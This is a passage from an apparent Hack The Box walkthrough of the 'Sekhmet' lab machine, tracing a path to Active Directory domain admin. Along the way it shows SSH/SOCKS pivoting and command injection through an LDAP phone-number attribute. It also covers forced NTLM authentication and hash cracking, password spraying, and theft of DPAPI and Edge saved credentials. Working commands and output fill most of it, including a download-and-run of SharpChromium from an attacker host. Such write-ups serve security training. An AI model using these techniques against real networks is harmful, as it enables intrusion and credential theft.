Let’s set up proxychains so we can communicate with the server in the 192 subnet. First, make sure the following line is in your /etc/proxychains4.conf:

```bash
socks5 127.0.0.1 1080
```

Now let’s set up reverse port forwarding:

```bash
~c 

-D 1080

Forwarding port.
```

We have to copy the configuration of the target’s /etc/krb5.conf onto our host:

```bash
sudo apt install krb5-user
```

```bash
[libdefaults]
        default_realm = WINDCORP.HTB

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true

        fcc-mit-ticketflags = true

[realms]
        WINDCORP.HTB = {
                kdc = hope.windcorp.htb
                admin_server = hope.windcorp.com
                default_domain = windcorp.htb
        }

[domain_realm]
        .windcorp.htb = WINDCORP.HTB
        windcorp.com = WINDCORP.HTB

[appdefaults]
        forwardable = true
                pam = {
                        WINDCORP.HTB = {
                                ignore_k5login = false
                                }
                }

```

Now let’s get ticket from ray.duncan again:

```bash
proxychains kinit ray.duncan

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:88  ...  OK
Password for ray.duncan@WINDCORP.HTB: 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:88  ...  OK

```

Verify:

```bash
klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: ray.duncan@WINDCORP.HTB

Valid starting       Expires              Service principal
10/20/2025 07:49:52  10/20/2025 12:49:52  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 10/21/2025 07:49:47
```

However, when we try to connect to the DC, we get timed out. 

```bash
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:445 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  hope.windcorp.htb:139 <--socket error or timeout!
do_connect: Connection to hope.windcorp.htb failed (Error NT_STATUS_CONNECTION_REFUSED)
```

Let’s check the firewall rules:

```bash
/usr/sbin/iptables -L -n

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0            state RELATED,ESTABLISHED
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            multiport dports 53,80,88,443 state NEW
ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0            multiport dports 53,88,123 state NEW
ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0            /* Allow Ping to work as expected */
DROP       all  --  0.0.0.0/0            192.168.0.0/24       ! owner UID match 0 state NEW

```

Maybe our tunnel is not created as root since we ssh’d in with webster. Let’s copy our public key in root’s .ssh foder and change ownership to root.

```bash
cp /home/webster/.ssh/authorized_keys ./.ssh

cd .ssh

chown root:root authorized_keys
```

Now let’s re-ssh to the host:

```bash
ssh -i webster root@windcorp.htb -D 1080
```

Now try our proxychains again:

```bash
proxychains nxc smb 192.168.0.2 -u ray.duncan -p pantera --shares

SMB         192.168.0.2     445    192.168.0.2      [*]  (name:192.168.0.2) (domain:192.168.0.2) (signing:True) (SMBv1:False) (NTLM:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:445  ...  OK
SMB         192.168.0.2     445    192.168.0.2      [-] 192.168.0.2\ray.duncan:pantera 
STATUS_NOT_SUPPORTED 

#NTLM not supported, we can use kerberos authentication
#first set up the ticket variable
#Export ticket
export KRB5CCNAME=/tmp/krb5cc_1000

```

Also, we have to write the IP to dc name in our /etc/hosts file:

```bash
192.168.0.2 hope.windcorp.htb
```

```bash
proxychains nxc smb hope.windcorp.htb --use-kcache --shares

SMB         hope.windcorp.htb 445    hope             [+] WINDCORP.HTB\ray.duncan from ccache 
SMB         hope.windcorp.htb 445    hope             [*] Enumerated shares
SMB         hope.windcorp.htb 445    hope             Share           Permissions     Remark
SMB         hope.windcorp.htb 445    hope             -----           -----------     ------
SMB         hope.windcorp.htb 445    hope             ADMIN$                          Remote Admin
SMB         hope.windcorp.htb 445    hope             C$                              Default share
SMB         hope.windcorp.htb 445    hope             IPC$            READ            Remote IPC
SMB         hope.windcorp.htb 445    hope             NETLOGON        READ            Logon server share 
SMB         hope.windcorp.htb 445    hope             SYSVOL          READ            Logon server share 
SMB         hope.windcorp.htb 445    hope             WC-Share        READ 
```

The non-default is WC-Share. Let’s use smbclient to view what files are in the dir:

```bash
proxychains smbclient --use-krb5-ccache=/tmp/krb5cc_1000 //hope.windcorp.htb/WC-Share

cd temp

get debug-users.txt
```

Let’s read the file:

```bash
IvanJennings43235345
MiriamMills93827637
BenjaminHernandez23232323
RayDuncan9342211
```

Not a lot to go on. Let’s also read the NETLOGON share, as that’s where startup logon scripts are stored:

```bash
proxychains smbclient --use-krb5-ccache=/tmp/krb5cc_1000 //hope.windcorp.htb/NETLOGON

get form.ps1
get "Update phone.lnk"
```

Let’s check out both files. First the .lnk file:

```bash
file Update\ phone.lnk       
          
Update phone.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Icon number=133, Unicoded, HasExpIcon "%SystemRoot%\System32\shell32.dll", MachineID hope, EnableTargetMetadata KnownFolderID 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7, Archive, ctime=Sat May  8 13:16:08 2021, atime=Fri Apr 29 01:49:30 2022, mtime=Sat May  8 13:16:08 2021, length=450560, window=showminnoactive, IDListSize 0x020d, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

Seems to be pointing to powershell.

The ps1 script provides a simple GUI for users to update their mobile phone number in Active Directory, which is likely used for SMS-based password reset systems. It retrieves the current number, allows the user to modify it, and saves the updated number back to AD if the user confirms.

Let’s use ldapsearch and see if  there is indeed a mobile attribute on the webserver host:

```bash
ldapsearch -H ldap://hope.windcorp.htb -b "DC=windcorp,DC=htb"
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2014.png)

Recall the debug-users.txt:

```bash
IvanJennings43235345
MiriamMills93827637
BenjaminHernandez23232323
RayDuncan9342211
```

This is the same phone number. Let’s attempt a blind command injection, since that’s the only way this will be useful. We use ldapmodify, first create the file e.g. edit to change attributes:

```bash
dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB
changetype: modify
replace: mobile
mobile: $(whoami)
```

Now let’s save the changes:

```bash
ldapmodify -H ldap://hope.windcorp.htb -f edit

SASL/GSS-SPNEGO authentication started
SASL username: ray.duncan@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB"

#verify:
ldapsearch -H ldap://hope.windcorp.htb -b "DC=windcorp,DC=htb" | grep -A 40 "Ray Duncan" | grep mobile

SASL/GSS-SPNEGO authentication started
SASL username: ray.duncan@WINDCORP.HTB
SASL SSF: 256
SASL data security layer installed.
mobile: $(whoami)

```

After 2 minutes, verify from the debug-users.txt file; we can already tell, the size of the file changed:

```bash
proxychains smbclient --use-krb5-ccache=/tmp/krb5cc_1000 //hope.windcorp.htb/WC-Share

cd temp/

get debug-users.txt
```

Output:

```bash
IvanJennings43235345
MiriamMills93827637
BenjaminHernandez23232323
RayDuncanwindcorp\scriptrunner

```

We see that domain user scriptrunner is running the script. However, it’s not likely that we can get a reverse shell from this, since scripts like this are usually ran with constrained language. We can check with this command:

```bash
$ExecutionContext.SessionState.LanguageMode

e.g.

mobile: $($ExecutionContext.SessionState.LanguageMode)
```

One thing we could do is set up a smb server and force scriptrunner to try and authenticate to us, which will provide us there with their NTLMv2 hash which we can attempt to crack. We first have to set up remote port forwarding to allow traffic to port 445 from all interfaces on webserver to be forwarded to our attack host port 445. Let’s change the configuration on webserver. We edit the `/etc/ssh/sshd_config` and modify the following:

```bash
GatewayPorts yes
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2015.png)

Save it. 

Now restart sshd service; this part is crucial

```bash
service sshd restart
```

Now reconnect to ssh:

```bash
ssh -i webster root@windcorp.htb -D 1080 -R 0.0.0.0:445:localhost:445
```

Verify that port 445 is listening on all interfaces:

```bash
ss -lntp

State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process                                                                
LISTEN   0        511              0.0.0.0:80            0.0.0.0:*      users:(("nginx",pid=424,fd=8),("nginx",pid=423,fd=8))                 
LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      users:(("sshd",pid=3274,fd=3))                                        
LISTEN   0        511            127.0.0.1:3000          0.0.0.0:*      users:(("node",pid=548,fd=18))                                        
LISTEN   0        128              0.0.0.0:445           0.0.0.0:*      users:(("sshd",pid=3276,fd=11)) 
```

Now start the smbserver:

```bash
sudo impacket-smbserver -smb2support share .
```

Now modify mobile on ldap, to force authentication:

```bash
mobile: $(net use \\webserver.windcorp.htb\share\test 2>&1)
```

Now save it:

```bash
ldapmodify -H ldap://hope.windcorp.htb -f edit

#verify
ldapsearch -H ldap://hope.windcorp.htb -b "DC=windcorp,DC=htb" | grep -A 40 "Ray Duncan" | grep mobile
```

Now we wait. After a while, in our smbserver, we get the NTLMv2 hash:

```bash
scriptrunner::WINDCORP:aaaaaaaaaaaaaaaa:10d5e7c6bda788c9f13a1200fdb4ff8d:0101000000000000000a1524d842dc01aa16e58300a22279000000000100100070007a0047006f004a004f00520054000300100070007a0047006f004a004f0052005400020010006e004500480068006b006c0055006f00040010006e004500480068006b006c0055006f0007000800000a1524d842dc0106000400020000000800300030000000000000000000000000210000f68124c14ac91bf62903040c6e6e050001cf4b074fda2f0305ab41cd59c43c530a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000
```

Let’s save it to a file and crack it with hashcat:

```bash
.\hashcat.exe -m 5600 ..\hashes.txt ..\rockyou.txt 

scriptrunner:!@p%i&J#iNNo1T2
```

## Privilege Escalation

Let’s try and request a ticket for scriptrunner:

```bash
kinit scriptrunner

#success
```

Can enumerate shares with him with nxc. 

```bash
#on attack host
export KRB5CCNAME=/tmp/krb5cc_1000

proxychains nxc smb hope.windcorp.htb --use-kcache --shares
```

No additional shares found.

Can also check this user’s group privilege via ldapsearch:

```bash
ldapsearch -H ldap://hope.windcorp.htb -Y GSSAPI -b "DC=windcorp,DC=htb" "(sAMAccountName=scriptrunner)" sAMAccountName memberOf userAccountControl servicePrincipalName

# scriptrunner, Users, windcorp.htb
dn: CN=scriptrunner,CN=Users,DC=windcorp,DC=htb
userAccountControl: 66048
sAMAccountName: scriptrunner
```

Just a normal domain user.

We can look for privileged group users:

```bash
ldapsearch -H ldap://hope.windcorp.htb -Y GSSAPI -b "DC=windcorp,DC=htb" "(|(cn=Remote Management Users)(cn=Remote Desktop Users)(cn=Administrators))" member

ldapsearch -H ldap://hope.windcorp.htb -b "DC=windcorp,DC=htb" "(|(cn=Remote Management Users)(cn=Remote Desktop Users)(cn=Administrators))" member

# Administrators, Builtin, windcorp.htb
dn: CN=Administrators,CN=Builtin,DC=windcorp,DC=htb
member: CN=Domain Admins,CN=Users,DC=windcorp,DC=htb
member: CN=Enterprise Admins,CN=Users,DC=windcorp,DC=htb
member: CN=Administrator,CN=Users,DC=windcorp,DC=htb

# Remote Desktop Users, Builtin, windcorp.htb
dn: CN=Remote Desktop Users,CN=Builtin,DC=windcorp,DC=htb

# Remote Management Users, Builtin, windcorp.htb
dn: CN=Remote Management Users,CN=Builtin,DC=windcorp,DC=htb
member: CN=IT,OU=Groups,DC=windcorp,DC=htb

ldapsearch -H ldap://hope.windcorp.htb -b "CN=IT,OU=Groups,DC=windcorp,DC=htb" "(objectClass=group)" member

# IT, Groups, windcorp.htb
dn: CN=IT,OU=Groups,DC=windcorp,DC=htb
member: CN=Beverley Williams,OU=IT,DC=windcorp,DC=htb
member: CN=Luis Jackson,OU=IT,DC=windcorp,DC=htb
member: CN=Benjamin Hernandez,OU=IT,DC=windcorp,DC=htb
member: CN=Laurie Prescott,OU=IT,DC=windcorp,DC=htb
member: CN=Patrick Silva,OU=IT,DC=windcorp,DC=htb
member: CN=Maddison Matthews,OU=IT,DC=windcorp,DC=htb
member: CN=Isaac May,OU=IT,DC=windcorp,DC=htb
member: CN=Florence Allen,OU=IT,DC=windcorp,DC=htb
member: CN=Mark Mitchell,OU=IT,DC=windcorp,DC=htb
member: CN=Shawn Clark,OU=IT,DC=windcorp,DC=htb
member: CN=Bob Wood,OU=IT,DC=windcorp,DC=htb

```

Let’s find all domain users ldapsearch:

```bash
ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" sAMAccountName "CN=Users,DC=windcorp,DC=HTB" | grep sAMAccountName | awk '{print $2}' > domainusers
```

Now, let’s upload kerbrute and find users with valid passwords. Kerbrute performs Kerberos pre-authentication brute-forcing, focusing on the initial AS-REQ/AS-REP phase of Kerberos ticket issuance. It doesn't request full TGTs (which would require valid passwords and generate more logs) but validates credentials by observing KDC responses. Let’s transfer the file over:

```bash
scp -i webster /home/kali/tools/kerbrute/kerbrute_linux_amd64 root@windcorp.htb:~/kerbrute
```

Now let’s perform a password spray and see if scriptrunner’s password was reused:

```bash
chmod +x kerbrute

./kerbrute passwordspray -d windcorp.htb domainusers '!@p%i&J#iNNo1T2'

2025/10/22 10:17:50 >  [+] VALID LOGIN:  Bob.Wood@windcorp.htb:!@p%i&J#iNNo1T2
2025/10/22 10:17:54 >  [+] VALID LOGIN:  scriptrunner@windcorp.htb:!@p%i&J#iNNo1T2

```

If we recall from our ldapsearch before, bob.wood is a member of remote management group, and a member of the administrator group. 

```bash
ldapsearch -H ldap://hope.windcorp.htb -Y GSSAPI -b "DC=windcorp,DC=htb" "(sAMAccountName=bob.wood)" sAMAccountName memberOf userAccountControl servicePrincipalName member

# Bob Wood, IT, windcorp.htb
dn: CN=Bob Wood,OU=IT,DC=windcorp,DC=htb
memberOf: CN=Adminusers,OU=Groups,DC=windcorp,DC=htb
memberOf: CN=IT,OU=Groups,DC=windcorp,DC=htb
userAccountControl: 66048
sAMAccountName: Bob.Wood

ldapsearch -H ldap://hope.windcorp.htb -Y GSSAPI -b "CN=IT,OU=Groups,DC=windcorp,DC=htb" "(objectClass=group)" memberOf

# IT, Groups, windcorp.htb
dn: CN=IT,OU=Groups,DC=windcorp,DC=htb
memberOf: CN=Protected Users,CN=Users,DC=windcorp,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=windcorp,DC=htb

ldapsearch -H ldap://hope.windcorp.htb -Y GSSAPI -b "DC=windcorp,DC=htb" "(sAMAccountName=bob.wood)" sAMAccountName memberOf userAccountControl servicePrincipalName adminCount allowedToDelegateTo
```

Let’s get bob.wood’s ticket and evil-winrm onto the machine:

```bash
proxychains kinit bob.wood

proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb
```

We are on:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2016.png)

Let’s check whether we are in constrained language mode, that would restrict a lot of our capabilities. 

```bash
$ExecutionContext.SessionState.LanguageMode

ConstrainedLanguage
```

We are.

Let’s check our privileges:

```bash
whoami /priv

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Nothing interesting.

Let’s check our powershell history:

```bash
type C:\Users\bob.wood\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Does not exist.

Let’s now check DPAPI for crendentials. The Data Protection Application Programming Interface (DPAPI) is a Windows cryptographic service that allows applications and the operating system to encrypt and protect sensitive data (e.g., passwords, API keys, browser credentials) using keys derived from a user’s credentials or system context.

- **Master Keys**: Symmetric keys stored in %APPDATA%\Microsoft\Protect\<SID> (for users) or %SystemRoot%\System32\Microsoft\Protect (for system). These keys encrypt data blobs.
- **Data Blobs**: Encrypted files or registry entries containing credentials (e.g., Chrome’s Login Data, RDP passwords).

These are normally stored in the `%APPDATA%\Roaming\Microsoft\Protect\<SID>` :

```bash
cd C:\Users\bob.wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761

ls -force
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2017.png)

We want to download the master key files. However, since we are in constrained language mode we cannot just download it. One way to bypass this is to use certutil to encode the file in base64, then decode it later on our host:

```bash
certutil -encode 3ebf1d50-8f5c-4a75-9203-20347331bad8 test
```

Now we output the content:

```bash
-----BEGIN CERTIFICATE-----
AgAAAAAAAAAAAAAAMwBlAGIAZgAxAGQANQAwAC0AOABmADUAYwAtADQAYQA3ADUA
LQA5ADIAMAAzAC0AMgAwADMANAA3ADMAMwAxAGIAYQBkADgAAAAAAAAAAAAAAAAA
iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAcyYbY+uNOC15HXPD
rWt4xFBGAAAJgAAAA2YAAIQpKENqwdH3+Q42xgY+vzf/Zoqh48Ai1asuixEAvao4
CjrEwkM228V54U20VyD2x+HYMCtiOkLv+MaAZtUYYDgRR1mdBddZvUkFJdm6ah1w
cC9BV957PaFOIBgecwElAh/HAkibCcd7AgAAAP81lRbwNrSOPETKqwWxP5xQRgAA
CYAAAANmAAD4b8/yEvguD8iuTHPDs2WjtvO0i2QSyw6M/oOomYZ7PHXpp2+MznTM
nTmVxqc2WUywi+zxPwb3jVuQJKquC8FhN/2fsDbMmWYCAAAAAAEAAFgAAADKa/6+
IfJmSqO4oAhXklb6wrZqDn/UbHkF1zXvPLHhHxTNqItR8Boy9Rm89UWZAUgauudM
EKURQuLsnXMuX3iE/FfC9/fwoBWM00p4StNEY5Ljb8p5MRWRASaNe9AelTZoyZGM
bmeCbFniv+yhpIBEebiBvT99s4mvx8A41hTeaAjGfXLcdBscBjdXCXlcJisS07or
JqGQ5L1dKaZqEi8Aw3FLusX08e6rrlLHIy0/itJxRWOYUSD0RigMUf7m1UzjY/Jv
/YyiS4vvZjburkB2BhEb8/B+G2S10vfBGGXPF/MGGUAz541YWzYm4I94WJF88eSw
9+WLs0LLcPj8Eu7U6I2J3vkDBPb11nFwVqpQHg0XH9qVX1aOqumiAoGLtXbaLlLi
oOsG2+cx/9iXUG3pNb+JkFQ4/nITLKnQJXTHDPVISFaHholhgYTeZFzTnHAn/j4O
X3Eaz97HcWp59ovlfki0XmOMtGs=
-----END CERTIFICATE-----
```

The other one:

```bash
certutil -encode a8bd1009-f2ac-43ca-9266-8e029f503e11 new
```

```bash
-----BEGIN CERTIFICATE-----
AgAAAAAAAAAAAAAAYQA4AGIAZAAxADAAMAA5AC0AZgAyAGEAYwAtADQAMwBjAGEA
LQA5ADIANgA2AC0AOABlADAAMgA5AGYANQAwADMAZQAxADEAAAAAAAAAAAAAAAAA
iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAuR6TrvjSY10cgOXc
3fH7sFBGAAAJgAAAA2YAANem3q9mPiPPHJWQskoFUjXgcbC1a2OvhQEvMZ/NfIz7
ITxvW6gXLykNnvZ1OgxkZ9oInH4GCUBg0thC4s5pfvwQmYWi82V0+Xzs4RJAijax
fRQw8/2PswPtY7z2JlVinYPMQnCFAZRfAgAAACm91rg5CTspaKCdO0VcEWlQRgAA
CYAAAANmAAAUAhae29/F3FmiRuhMIplSMuK0tKTxrI7kDSODLiaTfZiR+oVVTMay
fdiIEO3n842SpsHgohYYNij1u7sVitpm7XSzJrSekisCAAAAAAEAAFgAAADKa/6+
IfJmSqO4oAhXklb6Ra4KfBBwfypYTMvsKvdydZfn5JMN0WdQ0s58XVPFs1hGm7f+
kXkScTZCT+OLnxS747z80g3N4xuVwJ9EPy15q18vxycqNN5lXBPEjZcGpq6Wbj8U
yEIo2Jgwd+YGUtCLJuoL9D0YN46Ra1LVUgLNHWu1jybaikg5GN0yaTE3r0B0L2g/
beZ2yKJARPUshSuGlCf2HRsi6tO2yqBZBjMjFTZJQPt4hrKJm9bn5Qd5kZSggjy5
HVtLRvZZXjhMU+cXlfRuCD/AE54BnszNK78e7LZF7J3pRT9RbdbrgctaR8EXF2gM
Lfcxq7UBteEZCQAtS7mfZjvwI0i15/4rq8bYRxtwgc4PHUWN+jWNqjWLubp5NiV8
4TpmPxZFTXNgcAL1Yueop4Y1qcl/l+CeAGfwc3viVD2hESIAK6Zm3OFAByjsyxUh
29h5Ie/21Ms2D8kNzPms0rzLbXA=
-----END CERTIFICATE-----
```

Let’s copy only the base64 part and decode it back on our attack host:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2018.png)

Now decode it and save it to another file:

```bash
base64 -d 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64 > 3ebf1d50-8f5c-4a75-9203-20347331bad8

base64 -d a8bd1009-f2ac-43ca-9266-8e029f503e11 > a8bd1009-f2ac-43ca-9266-8e029f503e11

#verify with md5sum
Get-FileHash -Algorithm MD5 3ebf1d50-8f5c-4a75-9203-20347331bad8

D27BB1FBAB7AA09BED0F09134E533A62

md5sum 3ebf1d50-8f5c-4a75-9203-20347331bad8

d27bb1fbab7aa09bed0f09134e533a62
```

Now we have to search for credentials. A common place would be `%APPDATA%\Roaming\Microsoft\Credentials` or `%APPDATA%\Local\Microsoft\Credentials` . However, nothing was found in those dir. Let’s now move on to Edge stored logins.

- **Edge’s Encryption Process**:
    1. Edge encrypts saved passwords in Login Data (SQLite database, %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data) using an AES-256-GCM key.
    2. This AES key is itself encrypted with DPAPI and stored in the Local State file as os_crypt.encrypted_key.
    3. The DPAPI encryption of the AES key is tied to the user’s master key (in %APPDATA%\Microsoft\Protect\<SID>), which is encrypted with a key derived from the user’s password (!@p%i&J#iNNo1T2 for bob.wood) or domain credentials.
- **Decryption Process**:
    1. Extract the Local State file to get the encrypted AES key.
    2. Decrypt the user’s DPAPI master keys using the user’s password or NTLM hash.
    3. Use the master key to decrypt the os_crypt.encrypted_key from Local State.
    4. Use the decrypted AES key to decrypt the password_value blobs in Login Data.

First, let’s download Login Data.

We can find in `%APPDATA%\Local\Microsoft\Edge\User Data\Default\Login Data`

```bash
cd "C:\Users\Bob.Wood\Appdata\Local\Microsoft\Edge\User Data\Default\"

certutil -encode "Login Data" login
```

Now transfer it back to our host and decode it; this will be a sqlite database

```bash
base64 -d logindata.b64 > logindata.sqlite
```

Now, let’s download Local State; this is just a JSON file so we can just copy and paste direct.

```bash
cd "C:\Users\Bob.Wood\Appdata\Local\Microsoft\Edge\User Data\"

#copy and paste Local State file
```

Now, let’s extract the os_crypt.encrypted_key, and remove the DPAPI magic bytes and use pypykatz to describe the key, so we can find out which master key is used to encrypt this data blob:

```bash
cat local_state | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > encrypted_dpapi_blob

pypykatz dpapi describe blob encrypted_dpapi_blob

== DPAPI_BLOB ==
version: 1 
credential_guid: b'\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb' 
masterkey_version: 1 
masterkey_guid: a8bd1009-f2ac-43ca-9266-8e029f503e11 
flags: 16
<SNIP>
```

We see the master key a8. 

Now we have to generate a prekey, to decrypt the encrypted master key; the SID and password belongs to bob.wood:

```bash
pypykatz dpapi prekey password S-1-5-21-1844305427-4058123335-2739572863-2761 '!@p%i&J#iNNo1T2' > prekey_file
```

```bash
pypykatz dpapi masterkey a8bd1009-f2ac-43ca-9266-8e029f503e11 prekey_file -o masterkey_file

[GUID] a8bd1009-f2ac-43ca-9266-8e029f503e11 [MASTERKEY] 930b9acfcf2f581cdb9929c1ed7e9ace387ce63f95e4f9e0c5b48e43d5c36bc8f2d84056195d9b02b681c98beafb090a2cdc51e799a22f863d3ad227746e0066
```

Now finally, we can decrypt login data, we use chrome method as edge uses chromium:

```bash
pypykatz dpapi chrome --logindata logindata.sqlite masterkey_file local_state

file: logindata.sqlite user: bob.wood@windcorp.htb pass: b'SemTro\xc2\xa432756Gff' url: http://somewhere.com/action_page.php
file: logindata.sqlite user: bob.wood@windcorp.htb pass: b'SomeSecurePasswordIGuess!09' url: http://google.com/action_page.php
file: logindata.sqlite user: bob.woodADM@windcorp.com pass: b'smeT-Worg-wer-m024' url: http://webmail.windcorp.com/action_page.php

```

The most interesting login is bob.woodADM. Let’s see if we can get a ticket:

```bash
proxychains kinit bob.woodADM

klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: bob.woodADM@WINDCORP.HTB

Valid starting       Expires              Service principal
10/22/2025 06:03:10  10/22/2025 10:03:10  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 10/22/2025 10:03:10
```

Now we can search up this user’s privilges on webserver:

```bash
ldapsearch -H ldap://hope.windcorp.htb -b "DC=windcorp,DC=htb" "(sAMAccountName=bob.woodADM)" sAMAccountName memberOf userAccountControl servicePrincipalName

# Bob Wood - Admin, AdminAccounts, IT, windcorp.htb
dn: CN=Bob Wood - Admin,OU=AdminAccounts,OU=IT,DC=windcorp,DC=htb
memberOf: CN=Protected Users,CN=Users,DC=windcorp,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=windcorp,DC=htb
userAccountControl: 66048
sAMAccountName: bob.woodadm

```

Let’s login via winrm:

```bash
proxychains -i hope.windcorp.htb -

proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb
```

Checking our privileges and group membership, it’s confirmed we are domain admin:

```bash
whoami /all
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2019.png)

## Alternative Way

Another way to get Login Data is to use SharpChromium. We need to find a directory that is world writable that is not blocked by App Locker rules. We can use the following command to check what is blocked:

```bash
get-applockerpolicy -effective -xml
```

We copy and paste the output, save it to a file, and view it in our browser:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2020.png)

We search up world writable directories and find this github page:

https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56

In there, we find one directory not blocked:

```bash
c:\windows\debug\wia
```

Let’s try and write a file there:

```bash
cd c:\windows\debug\wia
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2021.png)

Let’s transfer SharpChromium.exe now:

```bash
#on attack
python3 -m http.server 8001

#on target
iwr http://10.10.16.5:8001/SharpChromium.exe -OutFile SharpChromium.exe
```

Now execute it:

```bash
.\SharpChromium.exe logins

[*] Beginning Edge extraction.

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://somewhere.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SemTro32756Gff

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://google.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SomeSecurePasswordIGuess!09

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://webmail.windcorp.com/action_page.php
Username : bob.woodADM@windcorp.com
Password : smeT-Worg-wer-m024

[*] Finished Edge extraction.

[*] Done.

```